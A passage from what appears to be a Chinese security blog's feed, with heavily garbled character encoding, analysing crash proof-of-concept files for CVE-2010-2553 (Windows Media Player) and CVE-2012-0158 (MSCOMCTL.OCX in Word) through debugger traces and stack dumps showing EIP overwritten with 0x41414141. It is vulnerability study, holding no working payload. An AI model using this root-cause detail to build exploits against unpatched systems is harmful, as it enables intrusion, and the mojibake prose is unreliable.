    ä¸Šé¢çš„æ–¹æ³•å¤±è´¥,äºæ˜¯é‡‡ç”¨ä¸‹é¢çš„æ–¹æ³•:
        è¿è¡Œwmplayer.exe
        odé™„åŠ wmplayer.exe
        wmplayer.exeæ‰“å¼€åŸæ¥çš„poc.avi
        ä¸­æ–­åˆ°å…³é”®callå¤„å³é”®æŸ¥æ‰¾æ‰€æœ‰æ¨¡å—é—´çš„è°ƒç”¨
        åœ¨æ¯ä¸ªkernel32.LocalAllocä¸Šè®¾ç½®æ–­ç‚¹(è¿™é‡Œæ²¡æœ‰HeapAlloc,åªæœ‰LocalAlloc),ä¸€å…±æœ‰10ä¸ªLocalAllocè°ƒç”¨
            LocalAllocå’ŒHeapAllocçš„åŒºåˆ«:
            http://bbs.csdn.net/topics/350074008
            ç”±ä¸Šé¢é“¾æ¥å¯çŸ¥,LocalAllocæ˜¯åœ¨è¿›ç¨‹é»˜è®¤å †ä¸Šåˆ†é…ç©ºé—´,è€ŒHeapAllocä¸€èˆ¬æ˜¯ç”±HeapCreateæ–°ç”Ÿæˆçš„å †ä¸­åˆ†é…ç©ºé—´
            ,å½“HeapAllocçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯GetProcessHeap()çš„å€¼é™¤å¤–
        é‡æ–°è¿è¡Œwmplayer.exeå¹¶ç”¨odé™„åŠ ,å¹¶ç”¨wmplayer.exeæ‰“å¼€åŸæ¥çš„poc.avi

    odä¸­æ–­åˆ°ä¸‹é¢çš„73b7b4a9å¤„çš„LocalAlloc
        73B7B4A2  |&amp;gt; \68 A0000000   push 0xA0                                             ; /Size = A0 (160.)
        73B7B4A7  |.  6A 40         push 0x40                                             ; |Flags = LPTR
        73B7B4A9  |.  FF15 4C10B773 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.LocalAlloc&amp;gt;]            ; \LocalAlloc

    æ­¤æ—¶åœ¨æ•°æ®çª—å£ä¸­ctrl+g:1c2caf8,å‘ç°1c2caf8å¤„å°šä¸”æ²¡æœ‰å†™å…¥poc.aviä¸­æ„é€ çš„æ•°æ®,è¯´æ˜è¿™ä¸ªLocalAllocä¸æ˜¯æ»¡è¶³
    &quot;poc.aviä¸­æ„é€ çš„æ•°æ®å†™å…¥å†…å­˜åçš„å †åˆ†é…&quot;çš„è°ƒç”¨,f8å•æ­¥åeax=001135C8,ä¸Šé¢çš„rep movsæŒ‡ä»¤å¤„çš„å †å—åœ¨a0000å †çš„
    147000å †å—é™„è¿‘

    f9
        ä¸­æ–­åˆ°73b72432å¤„çš„call kernel32.localalloc,æ­¤æ—¶æ•°æ®çª—å£ä¸­1c2caf8å¤„ä¾ç„¶æ²¡æœ‰å†™å…¥åŸæ¥poc.aviä¸­æ„é€ çš„æ•°æ®

    f9
        ä¾ç„¶æ²¡æœ‰å†™å…¥...
    f9
        è¿™ä¸ªf9è¦æŒ‰å¿«ä¸€ç‚¹,è¦ä¸ç„¶odä¸­ä¸ä¼šåœ¨1c2caf8å¤„å†™å…¥æ•°æ®,è¿™ä¸ªf9ä¹‹åä¸­æ–­ä¸‹æ¥åˆ°å…³é”®callè°ƒç”¨å¤„,æ­¤æ—¶æ•°æ®çª—å£ä¸­çš„
        1c2caf8å¤„å·²ç»å†™å…¥äº†åŸæ¥poc.aviä¸­çš„æ„é€ çš„æ•°æ®

    f9
        æ­¤æ—¶å¼¹å‡ºä¸Šé¢ä¸€æ ·çš„å†…å­˜ä¸å¯å†™çš„å‡ºé”™æ¡†(ç”±äºrep movså†™å…¥åˆ°ä¸å¯å†™çš„åœ°å€é€ æˆ)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-7.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ä¸Šé¢ä¸¤æ¬¡f9ä¹‹å1c2caf8ä¸­æ²¡æœ‰å†™å…¥æ•°æ®,ç¬¬ä¸‰æ¬¡f9ä¹‹å1c2caf8ä¸­å†™å…¥æ•°æ®,ç¬¬å››æ¬¡f9å¼‚å¸¸å‡ºç°å®Œ,è¦æ±‚æ‰¾åˆ°çš„LocalAllocç¬¦
    åˆè¿™ä¸ªæ¡ä»¶:
        &quot;poc.aviä¸­æ„é€ çš„æ•°æ®å†™å…¥å†…å­˜åçš„å †åˆ†é…&quot;
    ä½†æ˜¯ä»ä¸Šé¢ç¬¬2ä¸ªf9åˆ°ç¬¬å››ä¸ªf9ä¹‹é—´æ²¡æœ‰ä¸­æ–­åˆ°ä»»ä½•LocalAllocçš„è°ƒç”¨,è¯´æ˜æ‰¾ä¸åˆ°ç¬¦åˆæ¡ä»¶çš„å †å—åˆ†é…,ä¹Ÿå³æ²¡æœ‰DWORD
    SHOOTçš„æœºä¼š,ä¹Ÿå³æ²¡æœ‰åŠæ³•æ§åˆ¶eip,è¯´æ˜è¿™ä¸ªcve-2010-2553åªæ˜¯ä¸ªdos(denial of Service)ç±»æ¼æ´

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 17 Aug 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/17/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-2553/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/17/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-2553/</guid>
        
        <category>æ¼æ´æˆ˜äº‰</category>
        
        <category>æ¼æ´åˆ†æ</category>
        
        <category>å †æº¢å‡º</category>
        
        
        <category>äºŒè¿›åˆ¶</category>
        
      </item>
    
      <item>
        <title>æ¼æ´æˆ˜äº‰-cve-2012-0158</title>
        <description>&lt;h3 id=&quot;x00-about&quot;&gt;0x00 about&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;å®éªŒç¯å¢ƒ:
    windows xp sp3
    office word 2003 sp3
    offvis1.1
æ¼æ´æè¿°:
    MSCOMCTL.OCXä¸­å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-&quot;&gt;0x01 ç›¸å…³æŠ€å·§&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;poc.docæ˜¯rtfæ ¼å¼,é‡Œé¢çš„oleæ•°æ®ä»¥æ–‡æœ¬å½¢å¼å­˜å‚¨,offvisæ— æ³•è¯†åˆ«,å¯¼è‡´ä¸èƒ½é€šè¿‡offvisåˆ†ædocçš„ç»“æ„,å¯é€šè¿‡winhexå°†
0xD0CF11E0å¼€å§‹è‡³ç»“å°¾çš„æ‰€æœ‰çœ‹ä¸Šå»æ˜¯åå…­è¿›åˆ¶å½¢å¼è¡¨ç¤ºçš„æ–‡æœ¬æ•°æ®ä¿å­˜ä¸ºçœŸæ­£çš„åå…­è¿›åˆ¶å€¼,æœ€åæœ‰ä¸‰ä¸ªå³å¤§æ‹¬å·ä¸å±äºåå…­
è¿›åˆ¶å½¢å¼,ä¹Ÿå³å°†ä¸‹é¢å›¾1ä¸­poc.docè½¬æˆå›¾2ä¸­çš„test.doc
    æ“ä½œæ­¥éª¤:
    1&amp;gt;winhexæ‰“å¼€poc.doc,é€‰ä¸­textåŒºä¸­çš„D0CF11E0åˆ°æœ€åçš„0000(å·¦è¾¹ä¸ºhexåŒº,å³è¾¹ä¸ºtextåŒº)
    2&amp;gt;å•å‡»å³é”®é€‰æ‹©edit|copy block|normally
    3&amp;gt;æ–°å»ºä¸€ä¸ªç©ºç™½æ–‡ä»¶,20kå¤§å°(15kåº”è¯¥ä¹Ÿå¤Ÿäº†)
    4&amp;gt;åœ¨æ–°å»ºæ–‡ä»¶çš„offsetä¸º0å¤„å³é”®é€‰æ‹©edit|copyboard data|paste,åœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­é€‰æ‹©æœ€åä¸€ç§ç²˜è´´æ–¹å¼,å¹¶ä¿å­˜ä¸º
    test.doc
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;å›¾1
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å›¾2
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-2.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2&amp;gt;offvisç›¸å…³åˆ†æä¸­,æ‰“å¼€é‡æ–°ç”Ÿæˆçš„test.doc,åœ¨åˆ†ææ¨¡å—ä¸­é€‰æ‹©æœ€åä¸€ä¸ª,å¦‚ä¸‹å›¾3æ‰€ç¤º,41414141å¯¹åº”çš„æ•°æ®åœ¨offvisåˆ†æ
ä¸­çš„å¯¹åº”å­—æ®µå¦‚ä¸‹å›¾4ä¸­æ‰€ç¤º
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;å›¾3
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å›¾4
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-4.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x02-&quot;&gt;0x02 è°ƒè¯•åˆ†æ&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;æ‰“å¼€word,odé™„åŠ ,åœ¨wordä¸­æ‰“å¼€poc.doc,å¼¹å‡ºå‡ºé”™æ¡†,é”™è¯¯åœ°å€ä¸º41414141,ç”¨ä¸Šé¢çš„æ–¹æ³•é€šè¿‡offvisåˆ†ææ‰¾åˆ°å¯¹åº”å­—æ®µä¸º
Data,æˆ–è€…ç›´æ¥åŒå‡»æ‰“å¼€poc.doc,ä¹Ÿæ˜¯ç›´æ¥å¼¹å‡ºå‡ºé”™å¯¹è¯æ¡†,odæ²¡æœ‰åœ¨eip=0x41414141æ—¶æ•è·å¼‚å¸¸,ä½†æ˜¯immunity debuggerèƒ½å¤Ÿ
åœ¨eip=0x41414141å¤„ä¸­æ–­å¹¶é€€å‡º,å¯è¾¾åˆ°å’Œwindbgä¸€æ ·çš„æ•ˆæœ(åœ¨cve-2011-0104çš„åˆ†æä¸­,windbgå¯æ•è·åˆ°eipä¸ºä¸€ä¸ªæ­£å¸¸åœ°å€
æ—¶å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤ä¸ºæ­£å¸¸çš„æ±‡ç¼–æŒ‡ä»¤,ä½†æ˜¯è¯¥æŒ‡ä»¤ä¸­è®¿é—®äº†å¼‚å¸¸å†…å­˜æ•°æ®,è€Œè¿™é‡Œçš„æƒ…å†µæ˜¯eip=41414141,æ˜¯ä¸€ä¸ªä¸æ­£å¸¸çš„åœ°å€,
è¿™é‡Œé¢æ²¡æœ‰æŒ‡ä»¤),ä¸æ­¤åŒæ—¶,odé™„åŠ exeæ—¶ä¼šè¢«ç³»ç»Ÿå¼‚å¸¸å¤„ç†ç¨‹åºå…ˆæ•è·eip=0x41414141è¿™ä¸ªå¼‚å¸¸,å¯¹æ¯”odå’Œimmunity debugger,
å‘ç°odä¸­çš„è°ƒè¯•é€‰é¡¹ä¸­çš„å¼‚å¸¸é»˜è®¤å¤„ç†æƒ…å†µå¦‚ä¸‹å›¾5,immunity debuggerå¦‚å›¾6
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;å›¾5
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å›¾6
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-6.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;å°è¯•å°†odçš„é€‰é¡¹è®¾ç½®æˆå’Œimmunity debuggerä¸€æ ·,ä¾ç„¶ä¼šå¼¹å‡ºå¦‚ä¸‹å›¾7ä¸­çš„ç³»ç»Ÿå¼‚å¸¸å¯¹è¯æ¡†,çœ‹æ¥odåœ¨æ•è·å¼‚å¸¸çš„åŠŸèƒ½ä¸Šä¸å¦‚
immunity debugger
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;å›¾7
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-7.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;é‡æ–°é€‰æ‹©immunity debuggeré™„åŠ æ‰“å¼€çš„word.exe,word.exeæ‰“å¼€poc.doc,immunity debuggeræ•è·åˆ°word.exeå´©æºƒå¹¶å¾—åˆ°å´©æºƒæ—¶
çš„æ•°æ®å¦‚ä¸‹:(esp=121468,ebp=00000000,eip=41414141)

    ------------------å¯„å­˜å™¨çª—å£ä¸­--------------------
        EAX 00000000
        ECX 7C93003D ntdll.7C93003D
        EDX 00140608
        EBX 09FB0810
        ESP 00121468
        EBP 00000000
        ESI 002100B4
        EDI 00000000
        EIP 41414141
        C 0  ES 0023 32bit 0(FFFFFFFF)
        P 1  CS 001B 32bit 0(FFFFFFFF)
        A 0  SS 0023 32bit 0(FFFFFFFF)
        Z 1  DS 0023 32bit 0(FFFFFFFF)
        S 0  FS 003B 32bit 7FFDE000(FFF)
        T 0  GS 0000 NULL
        D 0
        O 0  LastErr ERROR_SUCCESS (00000000)
        EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
        ST0 empty
        ST1 empty
        ST2 empty
        ST3 empty
        ST4 empty
        ST5 empty
        ST6 empty
        ST7 empty
                       3 2 1 0      E S P U O Z D I
        FST 4000  Cond 1 0 0 0  Err 0 0 0 0 0 0 0 0  (EQ)
        FCW 127F  Prec NEAR,53  Mask    1 1 1 1 1 1
    ---------------------end--------------------------
    
    -------------------------å †æ ˆçª—å£ä¸­-----------------------------
    001213EC   00000001  ...
    001213F0   0012F904  ?.
    001213F4   7C92E900  .é–½|   ntdll.7C92E900
    001213F8   7C930040  @.æ¢   ntdll.7C930040
    001213FC   FFFFFFFF  ï£µï£µï£µï£µ
    00121400   7C93003D  =.æ¢   ntdll.7C93003D
    00121404   275C8800  .åœ½&#39;   MSCOMCTL.275C8800
    00121408   00140000  ...
    0012140C   00000000  ....
    00121410   08D9B008  ç™¾
    00121414   00000000  ....
    00121418   002100B4  ?!.
    0012141C   09FB0810  ?
    00121420   00008282  å€..
    00121424   00121458  X.
    00121428   275C8A0A  .å¥¬&#39;   MSCOMCTL.275C8A0A
    0012142C   00121450  P.
    00121430   08D9B008  ç™¾
    00121434   00008282  å€..
    00121438   00000000  ....
    0012143C   002100B4  ?!.
    00121440   09FB0810  ?
    00121444   6A626F43  Cobj
    00121448   00000064  d...
    0012144C   00008282  å€..
    00121450   00000000  ....
    00121454   00000000  ....
    00121458   00000000  ....
    0012145C   41414141  AAAA
    00121460   00000000  ....
    00121464   00000000  ....
    00121468   00000000  ....  ------&amp;gt;   &amp;lt;å´©æºƒæ—¶espçš„å€¼ä¸º121468&amp;gt;
    0012146C   00000000  ....
    00121470   00000000  ....
    00121474   00000000  ....
    00121478   00000000  ....
    0012147C   00000000  ....
    00121480   00000000  ....
    00121484   00000000  ....
    00121488   00000000  ....
    0012148C   00000000  ....
    00121490   00000000  ....
    00121494   00000000  ....
    00121498   00000000  ....
    0012149C   00000000  ....
    001214A0   00000000  ....
    001214A4   00000000  ....
    001214A8   00000000  ....
    001214AC   00000000  ....
    001214B0   00000000  ....
    001214B4   00000000  ....
    001214B8   00000000  ....
    001214BC   00000000  ....
    001214C0   00000000  ....
    001214C4   00000000  ....
    001214C8   00000000  ....
    ----------------------------end---------------------------------
    
    espä¸Šé¢æœ€è¿‘çš„ä¸€ä¸ªè¿”å›åœ°å€ä¸º121428å¤„çš„275c8a0a,å°è¯•åœ¨275c8a0aå¤„å•ç‹¬ä¸‹æ–­,æ— æ³•ç›´æ¥ä¸‹æ–­,éœ€è¦å•ç‹¬æ‰“å¼€
    MSCOMCTL.ocx,æ‰§è¡Œå‘½ä»¤:bp 0x275c8a0a,å•ç‹¬æ‰“å¼€c:\windows\system32\MSCOMCTL.ocx,ctrl+g:275c8a0a,å…·ä½“æŒ‡ä»¤å¦‚ä¸‹:

    -----------------275c8a0aé™„è¿‘----------------
    275C89C7   $  55            push ebp    ---------&amp;gt;å‡½æ•°å…¥å£ç‚¹
    275C89C8   .  8BEC          mov ebp,esp
    275C89CA   .  83EC 14       sub esp,0x14
    275C89CD   .  53            push ebx                                 ;  MSCOMCTL.&amp;lt;ModuleEntryPoint&amp;gt;
    275C89CE   .  8B5D 0C       mov ebx,dword ptr ss:[ebp+0xC]           ;  MSCOMCTL.27580000
    275C89D1   .  56            push esi
    275C89D2   .  57            push edi
    275C89D3   .  6A 0C         push 0xC
    275C89D5   .  8D45 EC       lea eax,dword ptr ss:[ebp-0x14]
    275C89D8   .  53            push ebx                                 ;  MSCOMCTL.&amp;lt;ModuleEntryPoint&amp;gt;
    275C89D9   .  50            push eax
    275C89DA   .  E8 8EFDFFFF   call MSCOMCTL.275C876D
    275C89DF   .  83C4 0C       add esp,0xC
    275C89E2   .  85C0          test eax,eax
    275C89E4   .  7C 6C         jl short MSCOMCTL.275C8A52
    275C89E6   .  817D EC 436F6&amp;gt;cmp dword ptr ss:[ebp-0x14],0x6A626F43
    275C89ED   .  0F85 92A60000 jnz MSCOMCTL.275D3085
    275C89F3   .  837D F4 08    cmp dword ptr ss:[ebp-0xC],0x8
    275C89F7   .  0F82 88A60000 jb MSCOMCTL.275D3085
    275C89FD   .  FF75 F4       push dword ptr ss:[ebp-0xC]              ;  MSCOMCTL.&amp;lt;ModuleEntryPoint&amp;gt;
    275C8A00   .  8D45 F8       lea eax,dword ptr ss:[ebp-0x8]
    275C8A03   .  53            push ebx                                 ;  MSCOMCTL.&amp;lt;ModuleEntryPoint&amp;gt;
    275C8A04   .  50            push eax
    275C8A05   .  E8 63FDFFFF   call MSCOMCTL.275C876D
    275C8A0A   .  8BF0          mov esi,eax
    --------------------end----------------------

    ä¹Ÿå³275c8a0aå¤„æ˜¯ä¸€ä¸ªè¿”å›åœ°å€(odå’Œimmunity debuggerçš„å †æ ˆçª—å£ä¸­æ˜¾ç¤ºå½¢å¦‚module.xxxxxxxxä¸ºæŸä¸ªæ¨¡å—çš„æŸä¸ªåœ°å€çš„
    åœ°æ–¹,å¤§å¤šæ•°æƒ…å†µéƒ½æ˜¯å‡½æ•°è¿”å›åœ°å€,ä¹Ÿå³åœ¨æ±‡ç¼–çª—å£ä¸­å¯¹åº”ä¸ºæŸæ¡call ...æŒ‡ä»¤çš„ä¸‹ä¸€å¥çš„åœ°å€,æœ‰å°‘æ•°ä¸æ˜¯è¿”å›åœ°å€)
    ä¸”275c8a0aåœ¨å‡½æ•°275c89c7ä¸­,bp 0x275c8a0aåé‡æ–°åŠ è½½word.exe,å¹¶ç”¨word.exeæ‰“å¼€poc.doc,æˆåŠŸåœ¨275c8a0aå¤„ä¸­æ–­
    ,å¯¹åº”æ•°æ®å¦‚ä¸‹:

    -------------------eip--------------------
    275C8A05   .  E8 63FDFFFF   call MSCOMCTL.275C876D
    275C8A0A   .  8BF0          mov esi,eax   ----&amp;gt;eip
    -------------------end--------------------

    -------------------å †æ ˆçª—å£------------------
    00121428   275C8A0A  MSCOMCTL.275C8A0A
    0012142C   00121450          -----------&amp;gt;esp
    00121430   08D9A008
    00121434   00008282
    00121438   00000000
    0012143C   002100FC
    00121440   09FC0810
    00121444   6A626F43
    00121448   00000064
    0012144C   00008282
    00121450   00000000
    00121454   00000000
    00121458   00000000         ------------&amp;gt;ebp
    0012145C   41414141
    00121460   00000000
    00121464   00000000
    00121468   00000000
    ---------------------end---------------------

å•æ­¥åˆ°275c8a56å¤„çš„retn 0x8å¤„æ—¶,eip=275C8A56,esp=12145c,[esp]=41414141

    ---------------æ±‡ç¼–çª—å£------------
    275C8A50   &amp;gt;  8BC6          mov eax,esi
    275C8A52   &amp;gt; |5F            pop edi
    275C8A53   . |5E            pop esi
    275C8A54   . |5B            pop ebx
    275C8A55   . |C9            leave
    275C8A56   . |C2 0800       retn 0x8    ---&amp;gt; eip=275c8a56
    ------------------end--------------
    
    -------------å †æ ˆçª—å£---------------
    00121428   275C8A0A  MSCOMCTL.275C8A0A
    0012142C   00121450
    00121430   08D9A008
    00121434   00008282
    00121438   00000000
    0012143C   002100FC
    00121440   09FC0810
    00121444   6A626F43
    00121448   00000064
    0012144C   00008282
    00121450   00000000
    00121454   00000000
    00121458   00000000
    0012145C   41414141   ---&amp;gt; esp=12145c
    00121460   00000000
    00121464   00000000
    00121468   00000000
    ---------------end------------------

å†å•æ­¥ç¨‹åºå°†è·‘é£åˆ°41414141å¤„æ‰§è¡Œ,å¹¶æ— æ³•ç»§ç»­è°ƒè¯•

è¿™é‡Œåˆ†æçš„æ–¹æ³•é‡‡ç”¨çš„æ˜¯æ ¹æ®ç¨‹åºå´©æºƒæ—¶å †æ ˆçª—å£ä¸­åœ¨å´©æºƒæ—¶çš„espä¸Šæ–¹ä½ç½®çš„å‡½æ•°è¿”å›åœ°å€å›æº¯,æ­¤ä¾‹ä¸­æ ¹æ®ç¨‹åºå´©æºƒæ—¶çš„esp
ä¸Šæ–¹(addr&amp;lt;esp,addr=121428,esp=121468)çš„121428å¤„çš„è¿”å›åœ°å€275C8A0Aå›æº¯åˆ°275c8a0aå¤„ä¸‹æ–­ç‚¹,275c8a0aå¤„äºå‡½æ•°
275C89C7ä¸­.

æ ¹æ®å´©æºƒæ—¶å †æ ˆçª—å£ä¸­çš„espä¸Šæ–¹çš„ä½ç½®çš„å‡½æ•°è¿”å›åœ°å€å›æº¯(ä¹Ÿå³å´©æºƒæ—¶espä¸Šæ–¹çš„ä½ç½®[addr&amp;lt;esp]é™„è¿‘å¯ä»¥æ‰¾åˆ°æŸ
å‡½æ•°è¿”å›åœ°å€,å°±åƒè¿™ä¸ªä¾‹å­ä¸€æ ·),è¯´æ˜espä¸Šæ–¹çš„å‡½æ•°è¿”å›åœ°å€å·²æ­£å¸¸ç»æ‰§è¡Œ(rentå®Œ)æ‰å»æ‰§è¡Œåˆ°å½“å‰å´©æºƒæ—¶çš„espå¯¹åº”eipçš„
åœ°æ–¹,è¿™æ ·è¯´æ˜å´©æºƒæ—¶espä¸Šæ–¹çš„æŸå‡½æ•°è¿”å›åœ°å€çš„å€¼ä¸å´©æºƒæ—¶çš„espå¯¹åº”çš„åˆšæ‰§è¡Œå®Œçš„eip(æ‰§è¡Œæœ¬ä¾‹eip=41414141ä¹‹å‰ä¸€æ­¥çš„
eip=275C8A56[å¯¹åº”rent 0x8])åœ¨æ±‡ç¼–çª—å£ä¸­å±äºåŒä¸€å¸§å‡½æ•°ä¸­,ä¸”æŸå‡½æ•°è¿”å›åœ°å€&amp;lt;è¯¥eip(æœ¬ä¾‹ä¸­ä¸º275c8a56),è¿™ç§æƒ…å†µå¯ä»¥ç›´
æ¥åœ¨å´©æºƒæ—¶çš„espä¸Šæ–¹çš„æŸå‡½æ•°è¿”å›åœ°å€åœ¨æ±‡ç¼–çª—å£ä¸­è·Ÿéšåçš„ä¸‹æ–­ç‚¹,ç„¶åå•æ­¥æ‰§è¡Œå°±èƒ½çœ‹åˆ°é”™è¯¯åœ¨å“ªé‡Œå‘ç”Ÿ.

ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œretnè¢«è¦†ç›–
a.é€šå¸¸æ˜¯å½“å‰å‡½æ•°å¸§ä¸­çš„ä¸€å¤„å­å‡½æ•°è°ƒç”¨(å½¢å¦‚call å­å‡½æ•°)å¯¼è‡´å½“å‰å‡½æ•°çš„çš„è¿”å›åœ°å€è¢«è¦†ç›–

æˆ–è€…è¯´æˆæ˜¯

b.å½“å‰å‡½æ•°ä¸­ï¼ˆå­å‡½æ•°ä¸­ï¼‰ä¸€å¤„æ•°æ®å¤åˆ¶æŒ‡ä»¤ï¼ˆå½¢å¦‚resp ...)å¯¼è‡´ä¸Šä¸€å¸§å‡½æ•°çš„è¿”å›åœ°å€è¢«è¦†ç›–

aä¸­çš„å­å‡½æ•°ä¸­åŒ…æ‹¬bä¸­çš„å¤åˆ¶æŒ‡ä»¤,bä¸­çš„ä¸Šä¸€å¸§å‡½æ•°å¯¹åº”aä¸­çš„å½“å‰å‡½æ•°,æ­¤ä¾‹ä¸­å¯¹åº”æƒ…å†µå¦‚ä¸‹ï¼š

---------------------start------------------------
275e7004    push ebp
...
...
275e7015    call 275c89c7
275e701a


                        275c89c7    push ebp
                        ...
                        ...
                        275C8A05    call 275c876d
                        275c8a0a
                        ...
                        ...
                        275c8a56    retn 0x8
----------------------end-------------------------

275c8a05å¤„çš„call 275c876dæ‰§è¡Œå®Œåå°†è¦†ç›–æ ˆä¸­çš„275e701aä¸º41414141,ä½¿å¾—275c8a56å¤„çš„retn 0x8è¿”å›åˆ°41414141å¤„æ‰§è¡Œ
åœ¨f7è·Ÿè¿›275c8a05å¤„çš„275c876dæ—¶ï¼Œå †æ ˆçª—å£ä¸­æ•°æ®å¦‚ä¸‹:

-------------start--------------
00121428  |275C8A0A  è¿”å›åˆ° MSCOMCTL.275C8A0A æ¥è‡ª MSCOMCTL.275C876D
0012142C  |00121450
00121430  |09FC0810
00121434  |00008282
00121438  |00000000
0012143C  |00210ECC
00121440  |09FC0810
00121444  |6A626F43
00121448  |00000064
0012144C  |00008282
00121450  |00210FB8
00121454  |275859E4  è¿”å›åˆ° MSCOMCTL.275859E4 æ¥è‡ª MSCOMCTL.27585BBA
00121458  ]00121480
0012145C  |275E701A  è¿”å›åˆ° MSCOMCTL.275E701A æ¥è‡ª MSCOMCTL.275C89C7
00121460  |00210ECC
00121464  |09FC0810
00121468  |00000000
0012146C  |00210EA8
00121470  |08C992F0
00121474  |275AC296  è¿”å›åˆ° MSCOMCTL.275AC296 æ¥è‡ª MSCOMCTL.275AC3AC
--------------end---------------
æŒ‰ç†æ¥è®²ï¼Œç”±äºè¿›å…¥åˆ°275c876då‡½æ•°å¸§ä¸­æ—¶æ ˆä¸­æ•°æ®å¦‚ä¸Šæ‰€ç¤ºï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯åœ¨275c876då‡½æ•°ä¸­æ‰§è¡Œåˆ°retnè¯­å¥å‰,275c876dä¸­
çš„å…¶ä»–æŒ‡ä»¤ä¼šè¦†ç›–å †æ ˆçª—å£ä¸­çš„ç¦»00121428å¤„çš„275c8a0aæœ€è¿‘çš„ä¸‹é¢çš„ä¸€ä¸ªè¿”å›åœ°å€ï¼Œä¹Ÿå³121454å¤„çš„275859e4,å› ä¸ºä»å †æ ˆçª—
å£ä¸­çœ‹ï¼Œè¿›å…¥275c876då‡½æ•°ä¹‹åï¼Œä¸‹é¢æœ€è¿‘çš„è¿”å›åœ°å€å°†æ˜¯è¿”å›åˆ°275c8a0aä¹‹ååœ¨å½“å‰275c876då‡½æ•°çš„ä¸Šä¸€å¸§å‡½æ•°ä¸­çš„retnæŒ‡
ä»¤å°†è¦è¿”å›çš„åœ°å€ï¼Œä¹Ÿå³ä»å †æ ˆçª—å£ä¸­æ¥çœ‹ï¼Œ275c8a56å¤„çš„retn 0x8åº”è¯¥æ˜¯è¦è¿”å›åˆ°121454å¤„çš„275859e4,ä½†æ˜¯å®é™…ä¸Šå¹¶ä¸æ˜¯è¿™
æ ·ï¼Œå®é™…æ˜¯275c8a56å¤„çš„retn 0x8å°†è¦è¿”å›åˆ°ä¸Šé¢å †æ ˆçª—å£ä¸­çš„ç¦»121428å¤„çš„275c8a0aä¸‹é¢ç¬¬äºŒè¿‘çš„12145cå¤„çš„275e701a,å› ä¸º
åœ¨275c89c7å‡½æ•°å¸§ä¸­å¼€å¤´ä¸€èˆ¬ä¼šæœ‰ä¸€ä¸ªæŠ¬é«˜æ ˆç©ºé—´çš„åŠ¨ä½œï¼ˆsub esp,0x..),è¿™ä¸ªæŠ¬é«˜åŠ¨ä½œæ­£å¥½æŠŠ00121454ä¸­çš„275859e4â€œæ‹‰è¿›â€
äº†275c89c7å‡½æ•°å¸§çš„æ ˆç©ºé—´ï¼Œä¹Ÿå³121454å¤„çš„275859e4è¿”å›åœ°å€å±äºä¹‹å‰æ²¡æœ‰æ‰§è¡Œ275c89c7çš„â€œæ— æ„ä¹‰æ®‹ä½™æ•°æ®â€,ä»è¿™é‡Œçœ‹å‡ºï¼Œ
ä»¥åä¸èƒ½çœ‹åˆ°å †æ ˆçª—å£ä¸­ä¸‹é¢æœ€è¿‘çš„è¿”å›åœ°å€å°†è¦é¦–å…ˆè¿”å›ï¼Œå¹¶ä¸ä¸€å®šï¼Œè¿˜æœ‰çš„å¯èƒ½æ˜¯æœ€è¿‘çš„è¿”å›åœ°å€å¹¶ä¸æ˜¯â€œæœ‰æ„ä¹‰çš„è¿”å›åœ°
